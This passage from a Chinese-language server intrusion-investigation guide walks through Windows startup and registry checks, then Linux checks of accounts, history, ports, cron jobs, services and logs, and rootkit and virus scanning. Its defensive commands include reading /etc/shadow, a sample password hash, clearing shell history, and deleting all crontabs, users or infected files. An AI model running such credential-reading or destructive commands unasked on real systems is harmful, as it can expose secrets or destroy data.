</pre>
</div>
</div>
</div>
<div id="outline-container-h:e40411b5-cb77-466a-a2c9-6f1eb8f7de2f" class="outline-4">
<h4 id="h:e40411b5-cb77-466a-a2c9-6f1eb8f7de2f">检查启动项、计划任务、服务</h4>
<div class="outline-text-4" id="text-h:e40411b5-cb77-466a-a2c9-6f1eb8f7de2f">
<p>
<b>检查服务器是否有异常的启动项</b><br>
</p>

<p>
检查方法：<br>
</p>
<ul class="org-ul">
<li>登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br></li>
<li>单击开始菜单 &gt;【运行】，输入 msconfig ，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br></li>
<li><p>
单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：<br>
检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。<br>
注册表的作用：windows会把它的配置信息存储在注册表的数据库里，注册表就包含了计算机中每个用户的一些配置文件、系统的硬件信息、安装程序以及属性设置等等，windows在操作过程当中会不断的去引用这些信息。所以注册表也是攻击者喜欢攻击的一个目标。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce
</pre>
</div></li>
<li>利用安全软件查看启动项、开机时间管理等。<br></li>
<li>组策略，运行 gpedit.msc<br>
<ul class="org-ul">
<li>计算机配置中找到 Windows 设置，在"脚本(启动/关机)"中查看启动配置是否有可疑脚本<br>
组策略的作用：它提供了操作系统、应用程序以及一些活动目录当中用户设置的集中化的管理和配置，可以控制用户账户以及计算机账户的一些工作环境。<br></li>
</ul></li>
</ul>


<figure id="org435ede7">
<img src="./images/img_20230814_141546.png" alt="img_20230814_141546.png" width="60%"><br>

</figure>
</div>
</div>
</div>
<div id="outline-container-h:44523998-1c58-49c0-9428-26688ff69212" class="outline-3">
<h3 id="h:44523998-1c58-49c0-9428-26688ff69212">Linux入侵排查</h3>
<div class="outline-text-3" id="text-h:44523998-1c58-49c0-9428-26688ff69212">
<p>
<b>使用环境：CentOS</b><br>
</p>

<p>
针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，常见 Linux 服务器入侵排查的思路如下。<br>
</p>
</div>
<div id="outline-container-h:ac41c858-0a1f-4308-8234-d005472fd39e" class="outline-4">
<h4 id="h:ac41c858-0a1f-4308-8234-d005472fd39e">账号安全</h4>
<div class="outline-text-4" id="text-h:ac41c858-0a1f-4308-8234-d005472fd39e">
<p>
<b>基本使用</b><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#29992;&#25143;&#20449;&#24687;&#25991;&#20214;/etc/passwd
root:x:0:0:root:/root:/bin/bash

account:password:UID:GID:GECOS:directory:shell
&#29992;&#25143;&#21517;&#65306;&#23494;&#30721;&#65306;&#29992;&#25143;ID&#65306;&#32452;ID&#65306;&#29992;&#25143;&#35828;&#26126;&#65306;&#23478;&#30446;&#24405;&#65306;&#30331;&#38470;&#20043;&#21518;&#30340;shell &#27880;&#24847;&#65306;&#26080;&#23494;&#30721;&#21482;&#20801;&#35768;&#26412;&#26426;&#30331;&#38470;&#65292;&#36828;&#31243;&#19981;&#20801;&#35768;&#30331;&#38470;

2&#12289;&#24433;&#23376;&#25991;&#20214; /etc/shadow
root:$<span style="color: #a0522d;">6</span>$<span style="color: #a0522d;">oGs1PqhL2p3ZetrE</span>$<span style="color: #a0522d;">X7o7bzoouHQVSEmSgsYN5UD4</span>.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft 7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::

&#29992;&#25143;&#21517;&#65306;&#21152;&#23494;&#23494;&#30721;&#65306;&#26368;&#21518;&#19968;&#27425;&#20462;&#25913;&#26102;&#38388;&#65306;&#26368;&#23567;&#20462;&#25913;&#26102;&#38388;&#38388;&#38548;&#65306;&#23494;&#30721;&#26377;&#25928;&#26399;&#65306;&#23494;&#30721;&#38656;&#35201;&#21464;&#26356;&#21069;&#30340;&#35686;&#21578;&#22825;&#25968;&#65306;&#23494;&#30721; &#36807;&#26399;&#21518;&#30340;&#23485;&#38480;&#26102;&#38388;&#65306;&#36134;&#21495;&#22833;&#25928;&#26102;&#38388;&#65306;&#20445;&#30041;&#23383;&#27573;

&#31995;&#32479;&#29992;&#25143;&#26159;&#19981;&#33021;&#30331;&#24405;&#30340;&#65292;&#23494;&#30721;&#23383;&#27573;&#20026;&#26143;&#21495;&#65288;*&#65289;&#65307;
&#20004;&#20010;&#24863;&#21497;&#21495;&#65288;!!&#65289;&#34920;&#31034;&#36825;&#20010;&#29992;&#25143;&#34987;&#38145;&#23450;&#20102;&#65292;&#26080;&#27861;&#30331;&#24405;&#65307;
&#32654;&#20803;&#31526;&#21495;&#65288;$&#65289;&#20986;&#29616;&#22312;&#21152;&#23494;&#26684;&#24335;&#30340;&#23494;&#30721;&#37324;&#65292;&#36215;&#21040;&#20998;&#38548;&#20316;&#29992;&#65307;

&#30001;&#19977;&#37096;&#20998;&#32452;&#25104;&#30340;&#65292;&#20197;$<span style="color: #a0522d;">&#20998;&#38548;</span>&#65292;&#21363;&#65306;$<span style="color: #a0522d;">id</span>$<span style="color: #a0522d;">salt</span>$<span style="color: #a0522d;">encrypted</span>  $<span style="color: #a0522d;">&#25968;&#23383;</span>$<span style="color: #a0522d;">&#38543;&#26426;&#25968;</span>$<span style="color: #a0522d;">&#21152;&#23494;&#21518;&#30340;&#23494;&#30721;&#20018;</span>&#65307;&#31532;3&#20010; $ &#20998;&#38548;&#30340;&#25165;&#26159;&#30495;&#27491;&#30340;&#23494;&#30721;&#20018;&#65307;id&#34920;&#31034;&#21152;&#23494;&#31639;&#27861;&#65292;&#24403;id&#20026;1&#26102;&#65292;&#20351;&#29992;md5&#21152;&#23494;&#65292;&#20197;&#27492;&#31867;&#25512;&#65292;id&#20026;6&#37319;&#29992;SHA512&#36827;&#34892;&#21152;&#23494;&#12290;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">who &#26597;&#30475;&#24403;&#21069;&#30331;&#24405;&#29992;&#25143;&#65288;tty &#26412;&#22320;&#30331;&#38470; pts &#36828;&#31243;&#30331;&#24405;&#65289;

w &#26597;&#30475;&#31995;&#32479;&#20449;&#24687;&#65292;&#24819;&#30693;&#36947;&#26576;&#19968;&#26102;&#21051;&#29992;&#25143;&#30340;&#34892;&#20026;

uptime &#26597;&#30475;&#30331;&#38470;&#22810;&#20037;&#12289;&#22810;&#23569;&#29992;&#25143;&#65292;&#36127;&#36733;&#29366;&#24577;
</pre>
</div>

<p>
<b>入侵排查</b><br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#65289;&#26597;&#35810;&#29305;&#26435;&#29992;&#25143;(uid&#20026;0)
awk -F: <span style="color: #8b2252;">'$3==0{print $1}'</span> /etc/passwd

2&#65289;&#26597;&#35810;&#21487;&#20197;&#36828;&#31243;&#30331;&#24405;&#30340;&#36134;&#21495;&#20449;&#24687;
awk <span style="color: #8b2252;">'/\$1|\$6/{print $1}'</span> /etc/shadow

3&#65289;&#38500;root&#36134;&#21495;&#22806;&#65292;&#20854;&#20182;&#36134;&#21495;&#26159;&#21542;&#23384;&#22312;sudo&#26435;&#38480;&#12290;&#22914;&#38750;&#31649;&#29702;&#38656;&#35201;&#65292;&#26222;&#36890;&#36134;&#21495;&#24212;&#21024;&#38500;sudo&#26435;&#38480;
more /etc/sudoers | grep -v <span style="color: #8b2252;">"^#\|^$"</span> | grep <span style="color: #8b2252;">"ALL=(ALL)"</span>

4&#65289;&#31105;&#29992;&#25110;&#21024;&#38500;&#22810;&#20313;&#21450;&#21487;&#30097;&#30340;&#36134;&#21495;
usermod -L user &#31105;&#29992;&#36134;&#21495;&#65292;&#36134;&#21495;&#26080;&#27861;&#30331;&#24405;&#65292;/etc/shadow &#31532;&#20108;&#26639;&#20026; ! &#24320;&#22836;
userdel user &#21024;&#38500; user &#29992;&#25143;
userdel -r user &#23558;&#21024;&#38500; user &#29992;&#25143;&#65292;&#24182;&#19988;&#23558; /home &#30446;&#24405;&#19979;&#30340; user &#30446;&#24405;&#19968;&#24182;&#21024;&#38500;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:6e8d634e-1453-4cd3-92b7-fdd8dfcff9c0" class="outline-4">
<h4 id="h:6e8d634e-1453-4cd3-92b7-fdd8dfcff9c0">历史命令</h4>
<div class="outline-text-4" id="text-h:6e8d634e-1453-4cd3-92b7-fdd8dfcff9c0">
<p>
<b>基本使用</b><br>
通过 .bash_history 文件查看账号执行过的系统命令<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">1&#12289;root&#29992;&#25143;&#30340;&#21382;&#21490;&#21629;&#20196;
histroy

2&#12289;&#25171;&#24320; /home &#21508;&#36134;&#21495;&#30446;&#24405;&#19979;&#30340; .bash_history&#65292;&#26597;&#30475;&#26222;&#36890;&#36134;&#21495;&#25191;&#34892;&#30340;&#21382;&#21490;&#21629;&#20196;&#12290;

3&#12289;&#21382;&#21490;&#25805;&#20316;&#21629;&#20196;&#30340;&#28165;&#38500;&#65306;history -c
&#20294;&#27492;&#21629;&#20196;&#24182;&#19981;&#20250;&#28165;&#38500;&#20445;&#23384;&#22312;&#25991;&#20214;&#20013;&#30340;&#35760;&#24405;&#65292;&#22240;&#27492;&#38656;&#35201;&#25163;&#21160;&#21024;&#38500; .bash_profile &#25991;&#20214;&#20013;&#30340;&#35760;&#24405;&#12290;
</pre>
</div>

<p>
<b>入侵排查</b><br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#36827;&#20837;&#29992;&#25143;&#30446;&#24405;&#19979;&#65292;&#23548;&#20986;&#21382;&#21490;&#21629;&#20196;
cat .bash_history &gt;&gt; history.txt
</pre>
</div>
</div>
</div>
<div id="outline-container-h:9fb560c0-8826-4fa6-b694-6e6670b17165" class="outline-4">
<h4 id="h:9fb560c0-8826-4fa6-b694-6e6670b17165">检查异常端口</h4>
<div class="outline-text-4" id="text-h:9fb560c0-8826-4fa6-b694-6e6670b17165">
<p>
使用 netstat 网络连接命令，分析可疑端口、IP、PID<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">netstat -antlp

&#26597;&#30475; pid &#25152;&#23545;&#24212;&#30340;&#36827;&#31243;&#25991;&#20214;&#36335;&#24452;:
&#36816;&#34892; ls -l /proc/$<span style="color: #a0522d;">PID</span>/exe &#25110; file /proc/$<span style="color: #a0522d;">PID</span>/exe&#65288;$<span style="color: #a0522d;">PID</span> &#20026;&#23545;&#24212;&#30340; pid &#21495;&#65289;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:d329003d-c06e-4b34-bfc3-5a0d70c88f92" class="outline-4">
<h4 id="h:d329003d-c06e-4b34-bfc3-5a0d70c88f92">检查异常进程</h4>
<div class="outline-text-4" id="text-h:d329003d-c06e-4b34-bfc3-5a0d70c88f92">
<p>
使用 ps 命令，分析进程<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">ps aux | grep pid
</pre>
</div>
</div>
</div>
<div id="outline-container-h:ac57c193-f535-4878-9aa4-45de3d31cb19" class="outline-4">
<h4 id="h:ac57c193-f535-4878-9aa4-45de3d31cb19">检查开机启动项</h4>
<div class="outline-text-4" id="text-h:ac57c193-f535-4878-9aa4-45de3d31cb19">
<p>
<b>基本使用</b><br>
</p>

<p>
Linux系统有7个系统运行级别（runlevel）:<br>
</p>
<ul class="org-ul">
<li>运行级别0：系统停机状态，系统默认运行级别不能设为0，否则不能正常启动<br></li>
<li>运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登陆<br></li>
<li>运行级别2：多用户状态(没有NFS)<br></li>
<li>运行级别3：完全的多用户状态(有NFS)，登陆后进入控制台命令行模式<br></li>
<li>运行级别4：系统未使用，保留<br></li>
<li>运行级别5：X11控制台，登陆后进入图形GUI模式<br></li>
<li>运行级别6：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动<br></li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">&#36816;&#34892;&#32423;&#21035; &#21547;&#20041;
0 &#20851;&#26426;
1 &#21333;&#29992;&#25143;&#27169;&#24335;&#65292;&#21487;&#20197;&#24819;&#35937;&#20026;windows&#30340;&#23433;&#20840;&#27169;&#24335;&#65292;&#20027;&#35201;&#29992;&#20110;&#31995;&#32479;&#20462;&#22797;
2 &#19981;&#23436;&#20840;&#30340;&#21629;&#20196;&#34892;&#27169;&#24335;&#65292;&#19981;&#21547;NFS&#26381;&#21153;
3 &#23436;&#20840;&#30340;&#21629;&#20196;&#34892;&#27169;&#24335;&#65292;&#23601;&#26159;&#26631;&#20934;&#23383;&#31526;&#30028;&#38754;
4 &#31995;&#32479;&#20445;&#30041;
5 &#22270;&#24418;&#27169;&#24335;
6 &#37325;&#21551;&#21160;
</pre>
</div>

<p>
查看运行级别命令: <code>runlevel</code><br>
开机启动配置文件: /etc/rc.d/rc.local /etc/rc.d/rc[0~6].d<br>
</p>

<p>
chkconfig 命令用于检查，设置系统的各种服务<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">chkconfig --list [name] //&#26381;&#21153;&#21015;&#34920;[&#21487;&#26681;&#25454;&#23454;&#38469;&#38656;&#35201;&#65292;&#20572;&#25481;&#19981;&#29992;&#26381;&#21153;]
chkconfig --add [name] //&#26381;&#21153;&#28155;&#21152;[&#22914;&#32570;&#30465;&#65292;&#21017;&#20174;&#32570;&#30465;&#30340;init&#33050;&#26412;&#33258;&#21160;&#24314;&#31435;]
chkconfig --del [name] //&#26381;&#21153;&#21024;&#38500;[&#24182;&#25226;&#30456;&#20851;&#31526;&#21495;&#36830;&#25509;&#20174;/etc/rc[0-6].d&#21024;&#38500;]
</pre>
</div>

<p>
当我们需要设置开机启动的脚本时，只需要将可执行脚本放在 /etc/init.d 目录下，然后在/etc/rc.d/rc*.d 目录下建立软链接即可。<br>
注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级<br>
</p>

<p>
<b>入侵排查</b><br>
</p>

<p>
启动项文件：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">/etc/rc.d/rc.local
/etc/rc.d/rc[0~6].d

ls -l /etc/rc.d/rc3.d/
</pre>
</div>
</div>
</div>
<div id="outline-container-h:b79334bf-218d-402c-8ec9-6ed0cfd09b4d" class="outline-4">
<h4 id="h:b79334bf-218d-402c-8ec9-6ed0cfd09b4d">检查定时任务</h4>
<div class="outline-text-4" id="text-h:b79334bf-218d-402c-8ec9-6ed0cfd09b4d">
<p>
<b>基本使用</b><br>
</p>

<p>
1、利用 crontab 创建计划任务<br>
基本命令<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">crontab -l &#21015;&#20986;&#26576;&#20010;&#29992;&#25143;cron&#26381;&#21153;&#30340;&#35814;&#32454;&#20869;&#23481;
Tips&#65306;&#40664;&#35748;&#32534;&#20889;&#30340;crontab&#25991;&#20214;&#20250;&#20445;&#23384;&#22312; /var/spool/cron/&#29992;&#25143;&#21517; &#20363;&#22914;: /var/spool/cron/root

crontab -r &#21024;&#38500;&#27599;&#20010;&#29992;&#25143;cron&#20219;&#21153;(&#35880;&#24910;&#65306;&#21024;&#38500;&#25152;&#26377;&#30340;&#35745;&#21010;&#20219;&#21153;)

crontab -e &#20351;&#29992;&#32534;&#36753;&#22120;&#32534;&#36753;&#24403;&#21069;&#30340;crontab&#25991;&#20214; &#22914;&#65306;
*/1 * * * * echo <span style="color: #8b2252;">"hello world"</span> &gt;&gt; /tmp/test.txt <span style="color: #b22222;">#</span><span style="color: #b22222;">&#27599;&#20998;&#38047;&#20889;&#20837;&#25991;&#20214;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26143;&#21495;&#20195;&#34920;&#20998;&#26102;&#26085;&#26376;&#21608;</span>
</pre>
</div>

<p>
2、利用 anacron 命令实现异步定时任务调度<br>
</p>

<p>
<b>入侵排查</b><br>
重点关注以下目录中是否存在恶意脚本<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">/var/spool/cron/*
/etc/crontab
/etc/cron.d/*
/etc/cron.daily/*
/etc/cron.hourly/*
/etc/cron.monthly/*
/etc/cron.weekly/
/etc/anacrontab
/var/spool/anacron/*
</pre>
</div>
</div>
</div>
<div id="outline-container-h:5b46fbde-efda-408e-96e6-fc4b5ecaa174" class="outline-4">
<h4 id="h:5b46fbde-efda-408e-96e6-fc4b5ecaa174">检查服务</h4>
<div class="outline-text-4" id="text-h:5b46fbde-efda-408e-96e6-fc4b5ecaa174">
<p>
<b>服务自启动</b><br>
</p>

<p>
第一种修改方法：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">chkconfig [--level &#36816;&#34892;&#32423;&#21035;] [&#29420;&#31435;&#26381;&#21153;&#21517;] [on|off]
chkconfig &#8211;-level 2345 httpd on &#24320;&#21551;&#33258;&#21551;&#21160;
chkconfig httpd on &#65288;&#40664;&#35748;level&#26159;2345&#65289;
</pre>
</div>

<p>
第二种修改方法：<br>
修改 /etc/rc.d/rc.local 文件，加入 /etc/init.d/httpd start<br>
</p>

<p>
<b>入侵排查</b><br>
</p>

<p>
查询已安装的服务：<br>
RPM包安装的服务<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">
chkconfig --list &#26597;&#30475;&#26381;&#21153;&#33258;&#21551;&#21160;&#29366;&#24577;&#65292;&#21487;&#20197;&#30475;&#21040;&#25152;&#26377;&#30340;RPM&#21253;&#23433;&#35013;&#30340;&#26381;&#21153;
ps aux | grep crond &#26597;&#30475;&#24403;&#21069;&#26381;&#21153;

&#26597;&#30475;&#31995;&#32479;&#22312;3&#19982;5&#32423;&#21035;&#19979;&#30340;&#21551;&#21160;&#39033;
&#20013;&#25991;&#29615;&#22659;
chkconfig --list | grep <span style="color: #8b2252;">"3:&#21551;&#29992;\|5:&#21551;&#29992;"</span>
&#33521;&#25991;&#29615;&#22659;
chkconfig --list | grep <span style="color: #8b2252;">"3:on\|5:on"</span>
</pre>
</div>

<p>
源码包安装的服务<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#28304;&#30721;&#21253;&#26381;&#21153;&#30340;&#21551;&#21160;&#31649;&#29702;&#65306;/usr/local/
&#28304;&#30721;&#21253;&#26381;&#21153;&#30340;&#33258;&#21551;&#21160;&#31649;&#29702;&#65306;/etc/rc.d/init.d/
</pre>
</div>
</div>
</div>
<div id="outline-container-h:aad1612a-570d-4784-ae87-e9a897040b0c" class="outline-4">
<h4 id="h:aad1612a-570d-4784-ae87-e9a897040b0c">检查异常文件</h4>
<div class="outline-text-4" id="text-h:aad1612a-570d-4784-ae87-e9a897040b0c">
<p>
1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性。<br>
2、针对可疑文件可以使用 stat 查看创建修改时间。<br>
</p>
</div>
</div>
<div id="outline-container-h:7a6ff2be-e8c2-4f04-be72-45b597199d35" class="outline-4">
<h4 id="h:7a6ff2be-e8c2-4f04-be72-45b597199d35">检查系统日志</h4>
<div class="outline-text-4" id="text-h:7a6ff2be-e8c2-4f04-be72-45b597199d35">
<p>
日志默认存放位置：/var/log/<br>
查看日志配置情况：more /etc/rsyslog.conf<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#26085;&#24535;&#25991;&#20214; &#35828;&#26126;
/var/log/cron &#35760;&#24405;&#20102;&#31995;&#32479;&#23450;&#26102;&#20219;&#21153;&#30456;&#20851;&#30340;&#26085;&#24535;

/var/log/cups &#35760;&#24405;&#25171;&#21360;&#20449;&#24687;&#30340;&#26085;&#24535;

/var/log/dmesg &#35760;&#24405;&#20102;&#31995;&#32479;&#22312;&#24320;&#26426;&#26102;&#20869;&#26680;&#33258;&#26816;&#30340;&#20449;&#24687;&#65292;&#20063;&#21487;&#20197;&#20351;&#29992;dmesg&#21629;&#20196;&#30452;&#25509;&#26597;&#30475;&#20869;&#26680;&#33258;&#26816;&#20449;&#24687;

/var/log/mailog &#35760;&#24405;&#37038;&#20214;&#20449;&#24687;

/var/log/message &#35760;&#24405;&#31995;&#32479;&#37325;&#35201;&#20449;&#24687;&#30340;&#26085;&#24535;&#12290;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;&#20013;&#20250;&#35760;&#24405;Linux&#31995;&#32479;&#30340;&#32477;&#22823;&#22810;&#25968;&#37325;&#35201;&#20449;&#24687;&#65292;&#22914;&#26524;&#31995;&#32479;&#20986;&#29616;&#38382;&#39064;&#26102;&#65292;&#39318;&#20808;&#35201;&#26816;&#26597;&#30340;&#23601;&#24212;&#35813;&#26159;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;

/var/log/btmp &#35760;&#24405;&#38169;&#35823;&#30331;&#24405;&#26085;&#24535;&#65292;&#36825;&#20010;&#25991;&#20214;&#26159;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#26597;&#30475;&#65292;&#32780;&#35201;&#20351;&#29992;lastb&#21629;&#20196;&#26597;&#30475;

/var/log/lastlog &#35760;&#24405;&#31995;&#32479;&#20013;&#25152;&#26377;&#29992;&#25143;&#26368;&#21518;&#19968;&#27425;&#30331;&#24405;&#26102;&#38388;&#30340;&#26085;&#24535;&#65292;&#36825;&#20010;&#25991;&#20214;&#26159;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#35201;&#20351;&#29992;lastlog&#21629;&#20196;&#26597;&#30475;

/var/log/wtmp &#27704;&#20037;&#35760;&#24405;&#25152;&#26377;&#29992;&#25143;&#30340;&#30331;&#24405;&#12289;&#27880;&#38144;&#20449;&#24687;&#65292;&#21516;&#26102;&#35760;&#24405;&#31995;&#32479;&#30340;&#21551;&#21160;&#12289;&#37325;&#21551;&#12289;&#20851;&#26426;&#20107;&#20214;&#12290;&#21516;&#26679;&#36825;&#20010;&#25991;&#20214;&#20063;&#26159;&#19968;&#20010;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#38656;&#35201;&#20351;&#29992;last&#21629;&#20196;&#26469;&#26597;&#30475;

/var/log/utmp &#35760;&#24405;&#24403;&#21069;&#24050;&#32463;&#30331;&#24405;&#30340;&#29992;&#25143;&#20449;&#24687;&#65292;&#36825;&#20010;&#25991;&#20214;&#20250;&#38543;&#30528;&#29992;&#25143;&#30340;&#30331;&#24405;&#21644;&#27880;&#38144;&#19981;&#26029;&#21464;&#21270;&#65292;&#21482;&#35760;&#24405;&#24403;&#21069;&#30331;&#24405;&#29992;&#25143;&#30340;&#20449;&#24687;&#12290;&#21516;&#26679;&#36825;&#20010;&#25991;&#20214;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#35201;&#20351;&#29992;w&#65292;who&#65292;users&#31561;&#21629;&#20196;&#26469;&#26597;&#35810;

/var/log/secure &#35760;&#24405;&#39564;&#35777;&#21644;&#25480;&#26435;&#26041;&#38754;&#30340;&#20449;&#24687;&#65292;&#21482;&#35201;&#28041;&#21450;&#36134;&#21495;&#21644;&#23494;&#30721;&#30340;&#31243;&#24207;&#37117;&#20250;&#35760;&#24405;&#65292;&#27604;&#22914;SSH&#30331;&#24405;&#65292;su&#20999;&#25442;&#29992;&#25143;&#65292;sudo&#25480;&#26435;&#65292;&#29978;&#33267;&#28155;&#21152;&#29992;&#25143;&#21644;&#20462;&#25913;&#29992;&#25143;&#23494;&#30721;&#37117;&#20250;&#35760;&#24405;&#22312;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;&#20013;
</pre>
</div>
<p>
安全人员比较关注的文件： /var/log/lastlog, /var/log/secure<br>
</p>

<p>
日志分析技巧：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#23450;&#20301;&#26377;&#22810;&#23569;IP&#22312;&#29190;&#30772;&#20027;&#26426;&#30340;root&#36134;&#21495;&#65306;
grep <span style="color: #8b2252;">"Failed password for root"</span> /var/log/secure | awk <span style="color: #8b2252;">'{print $11}'</span> | sort | uniq -c | sort -nr | more

2&#12289;&#23450;&#20301;&#26377;&#21738;&#20123;IP&#22312;&#29190;&#30772;&#65306;
grep <span style="color: #8b2252;">"Failed password"</span> /var/log/secure | grep -E -o <span style="color: #8b2252;">"(25[0-5]|2[0-4][0-9]|[01]? [0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]? [0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</span>|uniq -c

3&#12289;&#29190;&#30772;&#29992;&#25143;&#21517;&#23383;&#20856;&#26159;&#20160;&#20040;&#65311;
grep <span style="color: #8b2252;">"Failed password"</span> /var/log/secure|perl -e <span style="color: #8b2252;">'while($_=&lt;&gt;){ /for(.*?) from/; print "$1\n";}'</span> | uniq -c | sort -nr

4&#12289;&#30331;&#24405;&#25104;&#21151;&#30340;IP&#26377;&#21738;&#20123;&#65306;
grep <span style="color: #8b2252;">"Accepted "</span> /var/log/secure | awk <span style="color: #8b2252;">'{print $11}'</span> | sort | uniq -c | sort -nr | more

5&#12289;&#30331;&#24405;&#25104;&#21151;&#30340;&#26085;&#26399;&#12289;&#29992;&#25143;&#21517;&#12289;IP&#65306;
grep <span style="color: #8b2252;">"Accepted "</span> /var/log/secure | awk <span style="color: #8b2252;">'{print $1,$2,$3,$9,$11}'</span>
</pre>
</div>

<p>
手工排查：<br>
</p>
<ul class="org-ul">
<li>检查程序的签名、描述信息<br></li>
<li>查看程序的引用文件或者 DLL<br></li>
<li>网络连接<br></li>
<li>逆向分析<br></li>
</ul>
</div>
</div>
<div id="outline-container-h:6401c5d1-dfce-44a3-bce9-018909aaa639" class="outline-4">
<h4 id="h:6401c5d1-dfce-44a3-bce9-018909aaa639">工具查杀</h4>
<div class="outline-text-4" id="text-h:6401c5d1-dfce-44a3-bce9-018909aaa639">
</div>
<div id="outline-container-h:20ab8570-f66a-40ff-aeed-2fe75bab1537" class="outline-5">
<h5 id="h:20ab8570-f66a-40ff-aeed-2fe75bab1537">Rootkit查杀</h5>
<div class="outline-text-5" id="text-h:20ab8570-f66a-40ff-aeed-2fe75bab1537">
<p>
rootkit是特殊的恶意软件，它的功能是在目标机器上安装隐藏自身以及指定的文件、进程和网络连接等信息，来帮助攻击者做一些隐藏。比较常见的场景是木马后门等其它的恶意程序放在一起使用。在实际工作中比较难遇到，它是一种隐藏恶意程序、隐藏进程、隐藏网络的攻击方式。<br>
</p>

<ul class="org-ul">
<li>chkrootkit<br></li>
</ul>
<p>
网址：<a href="http://www.chkrootkit.org">http://www.chkrootkit.org</a><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20351;&#29992;&#26041;&#27861;&#65306;
wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
tar zxvf chkrootkit.tar.gz
<span style="color: #483d8b;">cd</span> chkrootkit-0.52
make sense
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#32534;&#35793;&#23436;&#25104;&#27809;&#26377;&#25253;&#38169;&#30340;&#35805;&#25191;&#34892;&#26816;&#26597;</span>
./chkrootkit
</pre>
</div>

<ul class="org-ul">
<li>rkhunter<br></li>
</ul>
<p>
网址：<a href="http://rkhunter.sourceforge.net">http://rkhunter.sourceforge.net</a><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20351;&#29992;&#26041;&#27861;&#65306;
wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter- 1.4.4.tar.gz
tar -zxvf rkhunter-1.4.4.tar.gz
<span style="color: #483d8b;">cd</span> rkhunter-1.4.4
./installer.sh --install
rkhunter -c 
</pre>
</div>
</div>
</div>
<div id="outline-container-h:b6b461cb-37b4-41ea-bd54-b56fbcbd7d54" class="outline-5">
<h5 id="h:b6b461cb-37b4-41ea-bd54-b56fbcbd7d54">病毒查杀</h5>
<div class="outline-text-5" id="text-h:b6b461cb-37b4-41ea-bd54-b56fbcbd7d54">
<ul class="org-ul">
<li>Clamav<br></li>
</ul>
<p>
网址：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a><br>
</p>

<p>
安装方式：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#23433;&#35013;</span>
yum install -y epel-release

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20351;&#29992;&#38463;&#37324;&#20113;epel&#28304;</span>
wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo
yum clean all
yum makecache
yum install -y clamav

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26356;&#26032;&#30149;&#27602;&#24211;</span>
freshclam

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25195;&#25551;&#26041;&#27861;</span>
clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log
clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log
clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25195;&#25551;&#24182;&#26432;&#27602;</span>
clamscan -r --remove /usr/bin/bsd-port
clamscan -r --remove /usr/bin/
clamscan -r --remove /usr/local/zabbix/sbin

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#26085;&#24535;&#21457;&#29616;</span>
cat /root/etcclamav.log | grep FOUND
</pre>
